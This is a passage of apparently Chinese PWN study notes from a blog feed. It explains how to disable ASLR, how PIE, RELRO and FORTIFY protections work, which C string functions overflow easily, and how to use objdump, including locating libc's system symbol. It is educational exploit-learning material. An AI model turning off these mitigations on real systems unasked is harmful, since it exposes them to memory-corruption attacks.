class="headerlink" title="方法一： 手动修改randomize_va_space文件"></a>方法一： 手动修改randomize_va_space文件</h5><p>诚如上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><br>注意，这里是先进root权限，后执行。不要问为什么sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space为什么会报错</p><h5 id="方法二：-使用sysctl控制ASLR"><a href="#方法二：-使用sysctl控制ASLR" class="headerlink" title="方法二： 使用sysctl控制ASLR"></a>方法二： 使用sysctl控制ASLR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><p>这是一种临时改变随机策略的方法，重启之后将恢复默认。如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。</p><h5 id="方法三：-使用setarch控制单个程序的随机化"><a href="#方法三：-使用setarch控制单个程序的随机化" class="headerlink" title="方法三： 使用setarch控制单个程序的随机化"></a>方法三： 使用setarch控制单个程序的随机化</h5><p>如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setarch `uname -m` -R ./your_program</span><br></pre></td></tr></table></figure><br>-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)</p><h5 id="方法四：-在GDB场景下，使用set-disable-randomization-off"><a href="#方法四：-在GDB场景下，使用set-disable-randomization-off" class="headerlink" title="方法四： 在GDB场景下，使用set disable-randomization off"></a>方法四： 在GDB场景下，使用set disable-randomization off</h5><p>在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。<br>当然，这里开启，关闭和查看的方法看起来就比较正规了。<br>关闭ASLR：<br><code>set disable-randomization on</code><br>开启ASLR：<br><code>set disable-randomization off</code><br>查看ASLR状态：<br><code>show disable-randomization</code></p><h3 id="ASLR与PIE的区别"><a href="#ASLR与PIE的区别" class="headerlink" title="ASLR与PIE的区别"></a>ASLR与PIE的区别</h3><p>首先，ASLR的是操作系统的功能选项，作用于executable（ELF）装入内存运行时，因而只能随机化stack、heap、libraries的基址；而PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE），作用于excutable编译过程，可将其理解为特殊的PIC（so专用，Position Independent Code），加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。<br>其次，ASLR早于PIE出现，所以有return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等绕过ASLR的技术；而在ASLR+PIE之后，这些bypass技术就都失效了，只能借助其他的信息泄露漏洞泄露基址（常用libc基址）。<br>最后，ASLR有0/1/2三种级别，其中0表示ASLR未开启，1表示随机化stack、libraries，2还会随机化heap。</p><blockquote><p>ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。</p></blockquote><h2 id="4-RELRO"><a href="#4-RELRO" class="headerlink" title="4.RELRO"></a>4.RELRO</h2><p>Relocation Read-Only(RELRO)可以使程序某些部分成为只读的。它分为两种:Partial RELRO和Full RELRO，即:部分RELRO和完全RELRO。<br><em>部分RELRO</em>是GCC的默认设置，几乎所有的二进制文件都至少使用部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖GOT。<br><em>完全RELRO</em>使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><blockquote><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度应尽量减少可写的存储区域</p><h2 id="RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。如果RELRO为Partial-RELRO，就说明对GOT表具有写权限"><a href="#RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。如果RELRO为Partial-RELRO，就说明对GOT表具有写权限" class="headerlink" title="RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。如果RELRO为Partial RELRO，就说明对GOT表具有写权限"></a>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。如果RELRO为Partial RELRO，就说明对GOT表具有写权限</h2><p>主要用来保护重定位表段对应数据区域，默认可写<br>Partial RELRO: .got不可写，got.pIt可写<br>Full RELRO: .got和got.pIt不可写<br>got.plt可以简称为got表</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GCC用法</span></span><br><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，是Partial RELRO</span></span><br><span class="line">gcc -z norelro -o test test.c <span class="comment">// 关闭，即No RELRO</span></span><br><span class="line">gcc -z lazy -o test test.c <span class="comment">// 部分开启，即Partial RELRO</span></span><br><span class="line">gcc -z now -o test test.c <span class="comment">// 全部开启</span></span><br><span class="line">-z norelro / -z lazy / -z <span class="title function_">now</span> <span class="params">(关闭 / 部分开启 / 完全开启)</span></span><br></pre></td></tr></table></figure><h2 id="编外-FORTIFY"><a href="#编外-FORTIFY" class="headerlink" title="编外:FORTIFY"></a>编外:FORTIFY</h2><p>fortify是轻微的检查，用于检查是否存在缓冲区溢出的错误。适用于程序采用大量的字符串或者内存操作函数，如:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">memcpy</span>():</span><br><span class="line">描述：<span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span></span><br><span class="line">     从存储区str2复制n个字符到存储区str1</span><br><span class="line">  参数：str1 -- 指向用于存储复制内容的目标数组，类型强制转换为 <span class="type">void</span>* 指针</span><br><span class="line">     str2 -- 指向要复制的数据源，类型强制转换为 <span class="type">void</span>* 指针</span><br><span class="line">     n -- 要被复制的字节数</span><br><span class="line">  返回值：该函数返回一个指向目标存储区 str1 的指针</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">memset</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *str, <span class="type">int</span> c, <span class="type">size_t</span> n)</span></span><br><span class="line">     复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符</span><br><span class="line">  参数：str -- 指向要填充的内存块</span><br><span class="line">     c -- 要被设置的值。该值以 <span class="type">int</span> 形式传递，但是函数在填充内存块时是使用该值的无符号字符形式</span><br><span class="line">     n -- 要被设置为该值的字节数</span><br><span class="line">  返回值：该值返回一个指向存储区 str 的指针</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strcpy</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">     把 src 所指向的字符串复制到 dest，容易出现溢出</span><br><span class="line">  参数：dest -- 指向用于存储复制内容的目标数组</span><br><span class="line">     src -- 要复制的字符串</span><br><span class="line">  返回值：该函数返回一个指向最终的目标字符串 dest 的指针</span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">stpcpy</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">stpcpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src)</span></span><br><span class="line">     把src所指由<span class="literal">NULL</span>借宿的字符串复制到dest所指的数组中</span><br><span class="line">  说明：src和dest所指内存区域不可以重叠且dest必须有足够的空间来容纳src的字符串返回指向dest结尾处字符（<span class="literal">NULL</span>）的指针 </span><br><span class="line">  返回值：</span><br><span class="line">---------------------------------------------------------------------------------------    </span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strncpy</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br><span class="line">     把 src 所指向的字符串复制到 dest，最多复制 n 个字符。当 src 的长度小于 n 时，dest 的剩余部分将用空字节填充</span><br><span class="line">  参数：dest -- 指向用于存储复制内容的目标数组</span><br><span class="line">     src -- 要复制的字符串</span><br><span class="line">     n -- 要从源中复制的字符数</span><br><span class="line">  返回值：该函数返回最终复制的字符串</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strcat</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">     把 src 所指向的字符串追加到 dest 所指向的字符串的结尾</span><br><span class="line">  参数：dest -- 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串</span><br><span class="line">     src -- 指向要追加的字符串，该字符串不会覆盖目标字符串</span><br><span class="line">  返回值：</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strncat</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strncat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br><span class="line">     把 src 所指向的字符串追加到 dest 所指向的字符串的结尾，直到 n 字符长度为止</span><br><span class="line">  参数：dest -- 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串，包括额外的空字符</span><br><span class="line">     src -- 要追加的字符串</span><br><span class="line">     n -- 要追加的最大字符数</span><br><span class="line">  返回值：该函数返回一个指向最终的目标字符串 dest 的指针</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">sprintf</span><span class="params">()</span>:PHP</span><br><span class="line">  描述：<span class="title function_">sprintf</span><span class="params">(format,arg1,arg2,arg++)</span></span><br><span class="line">     arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推</span><br><span class="line">  参数：format -- 必需。规定字符串以及如何格式化其中的变量</span><br><span class="line">     arg1 -- 必需。规定插到 format 字符串中第一个 % 符号处的参</span><br><span class="line">     arg2 -- 可选。规定插到 format 字符串中第二个 % 符号处的参数</span><br><span class="line">     arg++ -- 可选。规定插到 format 字符串中第三、四等等 % 符号处的参数</span><br><span class="line">  返回值：返回已格式化的字符串</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">snprintf</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">int</span> <span class="title function_">snprintf</span> <span class="params">( <span class="type">char</span> * str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> * format, ... )</span></span><br><span class="line">     设将可变参数<span class="params">(...)</span>按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断</span><br><span class="line">  参数：str -- 目标字符串</span><br><span class="line">     size -- 拷贝字节数<span class="params">(Bytes)</span>如果格式化后的字符串长度大于 size</span><br><span class="line">     format -- 格式化成字符串</span><br><span class="line">  返回值：如果格式化后的字符串长度小于等于 size，则会把字符串全部复制到 str 中，并给其后添加一个字符串结束符 \0。 如果格式化后的字符串长度大于 size，超过 size 的部分会被截断，只将其中的 <span class="params">(size<span class="number">-1</span>)</span> 个字符复制到 str 中，并给其后添加一个字符串结束符 \0，返回值为欲写入的字符串长度</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">vsprintf</span><span class="params">()</span>:PHP</span><br><span class="line">  描述：<span class="title function_">vsprintf</span><span class="params">(format,argarray)</span> </span><br><span class="line">     与 <span class="title function_">sprintf</span><span class="params">()</span> 不同，<span class="title function_">vsprintf</span><span class="params">()</span> 中的参数位于数组中。数组元素将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的</span><br><span class="line">  参数：format -- 必需。规定字符串以及如何格式化其中的变量</span><br><span class="line">     argarray -- 必需。带有参数的一个数组，这些参数会被插到 format 字符串中的 % 符号处</span><br><span class="line">  返回值：以格式化字符串的形式返回数组值</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">vsnprintf</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">int</span> <span class="title function_">vsnprintf</span> <span class="params">(<span class="type">char</span> * s, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span> * format, va_list arg )</span></span><br><span class="line">     将格式化数据从可变参数列表写入大小缓冲区</span><br><span class="line">如果在<span class="built_in">printf</span>上使用格式，则使用相同的文本组成字符串，但使用由arg标识的变量参数列表中的元素而不是附加的函数参数，并将结果内容作为C字符串存储在s指向的缓冲区中 （以n为最大缓冲区容量来填充）。如果结果字符串的长度超过了n-1个字符，则剩余的字符将被丢弃并且不被存储，而是被计算为函数返回的值。在内部，函数从arg标识的列表中检索参数，就好像va_arg被使用了一样，因此arg的状态很可能被调用所改变。在任何情况下，arg都应该在调用之前的某个时刻由va_start初始化，并且在调用之后的某个时刻，预计会由va_end释放</span><br><span class="line">  参数：s -- 指向存储结果C字符串的缓冲区的指针，缓冲区应至少有n个字符的大小</span><br><span class="line">     n -- 在缓冲区中使用的最大字节数，生成的字符串的长度至多为n-1，为额外的终止空字符留下空，<span class="type">size_t</span>是一个无符号整数类型</span><br><span class="line">     format -- 包含格式字符串的C字符串，其格式字符串与<span class="built_in">printf</span>中的格式相同</span><br><span class="line">      arg -- 标识使用va_start初始化的变量参数列表的值</span><br><span class="line">  返回值：如果n足够大，则会写入的字符数，不包括终止空字符。如果发生编码错误，则返回负数。注意，只有当这个返回值是非负值且小于n时，字符串才被完全写入</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">gets</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">     从标准输入 <span class="built_in">stdin</span> 读取一行，并把它存储在 str 所指向的字符串中。当读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定</span><br><span class="line">  参数：str -- 这是指向一个字符数组的指针，该数组存储了 C 字符串</span><br><span class="line">  返回值：如果成功，该函数返回 str。如果发生错误或者到达文件末尾时还未读取任何字符，则返回 <span class="literal">NULL</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GCC用法</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=<span class="number">1</span>  仅仅只在编译时进行检查（尤其是<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>这种文件头）</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=<span class="number">2</span>  程序执行时也会进行检查（如果检查到缓冲区溢出，就会终止程序）</span><br></pre></td></tr></table></figure><p>在-D_FORTIFY_SOURCE=2时，通过对数组大小来判断替换strcpy、memcpy、memset等函数名，从而达到防止缓冲区溢出的作用</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础-something_about_linux</title>
      <link href="/2025/02/06/PWN%E5%9F%BA%E7%A1%80-something-about-linux/"/>
      <url>/2025/02/06/PWN%E5%9F%BA%E7%A1%80-something-about-linux/</url>
      
        <content type="html"><![CDATA[<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><p>‌<strong>rwxp分别指Linux虚拟内存权限的不同部分，具体含义如下</strong>‌</p><ul><li>‌<strong>r</strong>‌：读权限（Read），表示可以读取内存区域的内容。</li><li>‌<strong>w</strong>‌：写权限（Write），表示可以修改内存区域的内容。</li><li>‌<strong>x</strong>‌：执行权限（Execute），表示可以执行内存区域中的代码。</li><li>‌<strong>p</strong>‌：私有权限（Private），表示该内存区域的内容在进程间是私有的，其他进程无法访问。<h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2>在Linux中，每个系统调用被赋予一个系统调用号。这样，通过独一无二的号就可以关联系统调用。当用户空间的进程执行一个系统调用的时候，这个系统调用号就用来指明到底是要执行哪个系统调用；进程不会提及系统调用的名称。</li></ul><p>系统调用号相当重要，一旦分配就不能再又任何变更，否则编译好的应用程序就会崩溃。此外，如果一个系统调用被删除，它所占用的系统调用号也不允许被回收利用，否则，以前编译过的代码会调用这个系统调用，但事实上却调用的是另外一个系统调用。</p><blockquote><p>Linux有一个“未实现”系统调用sys_ni_syscall(),它除了返回-ENOSYS外不做任何其他工作，这个错误号就是专门针对无效的系统调用而设的。虽然很罕见，但如果一个系统调用被删除，或者变得不可用，这个函数就要负责“填补空缺”</p></blockquote><p>内核记录了系统调用表中的所有已注册过的系统调用的列表，存储在sys_call_table中。每一种体系结构中，都明确定义了这个表。这个表为每一个有效的系统调用指定了唯一的系统调用号<br><a href="https://blog.csdn.net/qq_41202237/article/details/107249667">Linux32位系统调用号</a><br><a href="https://hollk.blog.csdn.net/article/details/107250349">Linux64位系统调用号</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·objdump</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7objdump/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7objdump/</url>
      
        <content type="html"><![CDATA[<p>objdump 命令是 <a href="https://www.gnu.org/software/binutils/">GNU Binutils</a> 二进制工具集的一员，用于查看目标文件或可执行文件的组成信息，以可读的形式打印二进制文件的内容。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump [options] obj_file <span class="comment">#[]表示可选，obj_file表示目标文件</span></span><br></pre></td></tr></table></figure></p><h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><p><code>objdump -T libc.so.6 |grep system</code></p><h2 id="objdump参数"><a href="#objdump参数" class="headerlink" title="objdump参数"></a>objdump参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a, --archive-headers</span><br><span class="line">显示档案头信息，展示档案每一个成员的文件格式。效果等同于命令 ar -tv</span><br><span class="line">-b, --target=BFDNAME</span><br><span class="line">指定目标码格式。这不是必须的，objdump 能自动识别许多格式，比如 objdump -b oasys -m vax -h fu.o 显示 fu.o 的头部摘要信息，明确指出该文件是 Vax 系统下用 Oasys 编译器生成的目标文件。objdump -i 将给出这里可以指定的目标码格式列表</span><br><span class="line">-C, --demangle[=STYLE]</span><br><span class="line">目标文件中的符号解码成用户级名称。比如移除符号修饰时在变量与函数名前添加的下划线等。</span><br><span class="line">-d, --disassemble</span><br><span class="line">反汇编目标文件，将机器指令反汇编成汇编代码</span><br><span class="line">-D, --disassemble-all</span><br><span class="line">与 -d 类似，但反汇编所有段（section）</span><br><span class="line">-z, --disassemble-zeroes</span><br><span class="line">一般反汇编输出将省略零块，该选项使得这些零块也被反汇编 </span><br><span class="line">-EB, -EL,--endian=&#123;big | little&#125;</span><br><span class="line">指定目标文件的字节序，在目标文件没描述字节序时很有用，例如 S-records。这个选项只影响反汇编</span><br><span class="line">-f, --file-headers</span><br><span class="line">显示每一个目标文件的头信息</span><br><span class="line">-F, --file-offsets</span><br><span class="line">反汇编时，打印每一个符号的偏移地址</span><br><span class="line">--file-start-context</span><br><span class="line">显示源码/汇编代码（假设为 -S）时，将上下文扩展到文件的开头</span><br><span class="line">-g, --debugging</span><br><span class="line">显示调试信息。企图解析保存在文件中的调试信息并以 C 语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持</span><br><span class="line">-e, --debugging-tags</span><br><span class="line">类似 -g 选项，但是生成的信息是和ctags工具相兼容的格式</span><br><span class="line">-h, --section-headers, --headers</span><br><span class="line">显示目标文件各个 section 的头部摘要信息</span><br><span class="line">-i, --info</span><br><span class="line">显示对于 -b 或者 -m 选项可用的架构和目标格式列表</span><br><span class="line">-j, --section=NAME</span><br><span class="line">仅显示指定名称的 section 的信息 </span><br><span class="line">-l, --line-numbers</span><br><span class="line">用文件名和行号标注相应的目标代码，仅仅和 -d、-D 或者 -r 一起使用</span><br><span class="line">-S,--<span class="built_in">source</span></span><br><span class="line">反汇编时尽可能使用源代码表示。隐含了-d参数</span><br><span class="line">-m, --architecture=MACHINE</span><br><span class="line">指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构</span><br><span class="line">-M, --disassembler-options=OPTIONS</span><br><span class="line">给反汇编程序传递参数，可以指定多个，使用逗号分隔</span><br><span class="line">-p, --private-headers</span><br><span class="line">打印目标文件格式的特定信息。打印的信息取决于目标文件格式，对于某些目标文件格式，不打印任何附加信息。</span><br><span class="line">-P, --private=OPTIONS</span><br><span class="line">打印目标文件格式的特定信息。OPTIONS 是一个逗号分隔的列表。例如对于XCOFF，可用的选项有 header, aout, sections, syms, relocs, lineno, loader, except, typchk, traceback and toc</span><br><span class="line">-r, --reloc</span><br><span class="line">显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来</span><br><span class="line">-R, --dynamic-reloc</span><br><span class="line">显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库</span><br><span class="line">-s, --full-contents</span><br><span class="line">显示section的完整内容。默认所有的非空section都会被显示</span><br><span class="line">-W[lLiaprmfFsoRt],--dwarf=[rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges,=pubtypes,=trace_info,=trace_abbrev,=trace_aranges,=gdb_index]</span><br><span class="line">显示文件中调试段的内容，如果存在的话</span><br><span class="line">-G, --stabs</span><br><span class="line">显示请求的任何 section 的全部内容。显示段 .stab、.stab.index 和 .stab.excl 的内容</span><br><span class="line">-t, --syms</span><br><span class="line">显示文件的符号表入口。类似于nm -s提供的信息</span><br><span class="line">-T, --dynamic-syms</span><br><span class="line">显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D,--dynamic 显示的信息</span><br><span class="line">-x, --all-headers</span><br><span class="line">显示所可用的头信息，包括符号表、重定位入口。-x 等价于 -a -f -h -p -r -t 同时指定</span><br><span class="line">-w, --wide</span><br><span class="line">为具有超过80列的输出设备格式化某些行。也不要在显示符号名称时截断符号名称</span><br><span class="line">--start-address=ADDRESS</span><br><span class="line">从指定地址开始显示数据，该选项影响 -d、-r 和 -s 选项的输出</span><br><span class="line">--stop-address=ADDRESS</span><br><span class="line">显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出</span><br><span class="line">--prefix-addresses</span><br><span class="line">反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式</span><br><span class="line">--no-show-raw-insn</span><br><span class="line">反汇编时，不显示汇编指令的机器码。当使用--prefix-addresses时，这是缺省选项</span><br><span class="line">--adjust-vma=OFFSET</span><br><span class="line">当解析信息时，首先给所有的段添加偏移值offset。当段地址与符号表不符时，这个选项很有用。比如将段放置到特殊地址，因为某个格式无法表示段地址，比如 a.out</span><br><span class="line">--special-syms</span><br><span class="line">显示特殊符号与用户不关心的符号</span><br><span class="line">--prefix=PREFIX</span><br><span class="line">当使用 -S 时，指定前缀添加到绝对路径中</span><br><span class="line">--prefix-strip=LEVEL</span><br><span class="line">指定剥离绝对路径中多少个前缀目录名。此选项只有在使用了选项 --prefix=PREFIX 才有效</span><br><span class="line">--insn-width=WIDTH</span><br><span class="line">指定反汇编后的指令输出的行宽，单位字节</span><br><span class="line">-V, --version</span><br><span class="line">版本信息</span><br><span class="line">-H, --<span class="built_in">help</span></span><br><span class="line">帮助信息</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="1-查看C程序的汇编代码和源代码"><a href="#1-查看C程序的汇编代码和源代码" class="headerlink" title="1.查看C程序的汇编代码和源代码"></a>1.查看C程序的汇编代码和源代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc -g test.c -o test</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">88</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">66</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> sum = add(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d, b=%d, a+b=%d\n&quot;</span>, a, b, sum);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> dif = sub(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d, b=%d, a-b=%d\n&quot;</span>, a, b, dif);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -D <span class="built_in">test</span> | less <span class="comment">#objdump -D命令来查看test的汇编代码。</span></span><br><span class="line">objdump -S <span class="built_in">test</span> | less <span class="comment">#objdump -S命令来以汇编和源代码的形式查看test的代码。</span></span><br></pre></td></tr></table></figure><h3 id="2-查看可执行文件中函数调用的地址"><a href="#2-查看可执行文件中函数调用的地址" class="headerlink" title="2.查看可执行文件中函数调用的地址"></a>2.查看可执行文件中函数调用的地址</h3><p>可以使用以下命令来查看可执行文件中的函数调用地址：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d -j .plt <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><h3 id="3-查看共享库中函数的地址"><a href="#3-查看共享库中函数的地址" class="headerlink" title="3.查看共享库中函数的地址"></a>3.查看共享库中函数的地址</h3><p>可以使用以下命令来查看共享库中函数的地址：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -T /lib/libc.so.6</span><br></pre></td></tr></table></figure></p><h3 id="4-查看可执行文件中的符号表"><a href="#4-查看可执行文件中的符号表" class="headerlink" title="4.查看可执行文件中的符号表"></a>4.查看可执行文件中的符号表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -t <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>可以在符号表中找到sub，add的地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#objdump -t test</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">test</span>:     file format elf64-x86-64</span><br><span class="line"> </span><br><span class="line">SYMBOL TABLE:</span><br><span class="line">0000000000400238 l    d  .interp        0000000000000000              .interp</span><br><span class="line">0000000000400254 l    d  .note.ABI-tag  0000000000000000              .note.ABI-tag</span><br><span class="line">0000000000400274 l    d  .note.gnu.build-id     0000000000000000              .note.gnu.build-id</span><br><span class="line">0000000000400298 l    d  .gnu.hash      0000000000000000              .gnu.hash</span><br><span class="line">00000000004002b8 l    d  .dynsym        0000000000000000              .dynsym</span><br><span class="line">0000000000400318 l    d  .dynstr        0000000000000000              .dynstr</span><br><span class="line">0000000000400358 l    d  .gnu.version   0000000000000000              .gnu.version</span><br><span class="line">0000000000400360 l    d  .gnu.version_r 0000000000000000              .gnu.version_r</span><br><span class="line">0000000000400380 l    d  .rela.dyn      0000000000000000              .rela.dyn</span><br><span class="line">0000000000400398 l    d  .rela.plt      0000000000000000              .rela.plt</span><br><span class="line">00000000004003c8 l    d  .init  0000000000000000              .init</span><br><span class="line">00000000004003f0 l    d  .plt   0000000000000000              .plt</span><br><span class="line">0000000000400420 l    d  .plt.got       0000000000000000              .plt.got</span><br><span class="line">0000000000400430 l    d  .text  0000000000000000              .text</span><br><span class="line">0000000000400634 l    d  .fini  0000000000000000              .fini</span><br><span class="line">0000000000400640 l    d  .rodata        0000000000000000              .rodata</span><br><span class="line">0000000000400678 l    d  .eh_frame_hdr  0000000000000000              .eh_frame_hdr</span><br><span class="line">00000000004006c0 l    d  .eh_frame      0000000000000000              .eh_frame</span><br><span class="line">0000000000600e10 l    d  .init_array    0000000000000000              .init_array</span><br><span class="line">0000000000600e18 l    d  .fini_array    0000000000000000              .fini_array</span><br><span 